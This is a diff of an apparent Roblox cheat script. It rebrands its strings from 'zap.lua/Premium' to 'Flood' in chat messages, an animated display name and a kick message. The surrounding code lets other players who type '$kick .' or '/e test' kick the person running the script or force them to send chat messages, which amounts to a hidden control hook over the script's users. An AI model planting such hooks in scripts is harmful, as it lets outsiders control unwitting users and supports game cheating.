@@ -219,7 +219,7 @@ function premium()
 		v.Chatted:connect(function(cht)
 			if cht:match("/e test") then
 				if game.Players.LocalPlayer ~= v then
-					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah yeah!","All")
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im Using Lock!","All")
 				end
 			end
 		
@@ -278,45 +278,45 @@ function premium()
 			if cht:match("$animate") then
 				if game.Players.LocalPlayer ~= v then
 								while true do
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z4')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] F')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FL')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za7')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.1')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lv')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu4')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lua')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] $$$$$$$')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLO')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] BEST CODER')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOODY$')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] ')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
 								wait(1)
 					end
 				end
@@ -571,7 +571,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("$kick .") then
 				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
+					game.Players.LocalPlayer:Kick("                                Kicked by Flood")
 				end
 			end
 		
@@ -730,7 +730,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("/e test") then
 				if game.Players.LocalPlayer ~= v then
-					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah yeah!","All")
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("IM LOCKING!","All")
 				end
 			end
 		
